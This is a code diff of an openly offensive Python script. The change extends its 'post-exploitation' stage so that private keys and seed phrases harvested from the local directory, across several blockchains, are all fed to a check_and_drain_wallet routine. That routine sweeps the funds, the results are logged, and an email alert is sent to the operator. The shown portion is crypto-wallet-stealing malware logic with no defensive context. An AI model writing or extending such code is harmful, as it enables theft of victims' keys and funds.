@@ -77,15 +77,27 @@ def main():
         
         print(f"\n{GREEN}[+] Initiating post-exploitation asset harvesting & financial sweep...{RESET}")
         
-        # 1. Harvest Private Keys & Display in Plaintext
+        # 1. Harvest Private Keys & Seed Phrases (All Chains)
         keys_found = harvest_private_keys(".")
         
-        # 2. Check Crypto Balances & Execute Transfer if Wallets Found
+        # 2. Universal Multi-Asset Check & Automated Sweep (Processes EVM, BTC, LTC, XRP, SOL, Seeds)
         drain_results = []
         for key in keys_found:
-            if "Hex Private Key" in key["type"]:
-                bal, drained, tx = check_and_drain_wallet(key["key_content"])
-                drain_results.append({"wallet": key["key_content"], "balance": bal, "drained": drained, "tx": tx})
+            key_content = key.get("key_content")
+            key_type = key.get("type")
+            
+            print(f"\n{YELLOW}[*] Processing harvested artifact [{key_type}] for balance audit...{RESET}")
+            try:
+                bal, drained, tx = check_and_drain_wallet(key_content)
+                drain_results.append({
+                    "type": key_type,
+                    "artifact": key_content[:15] + "...", 
+                    "balance": bal, 
+                    "drained": drained, 
+                    "tx": tx
+                })
+            except Exception as e:
+                print(f"{RED}[-] Drainage routing error for artifact: {e}{RESET}")
 
         # 3. Dispatch Encrypted Email Alert to Your Inbox
         for hit in hits:
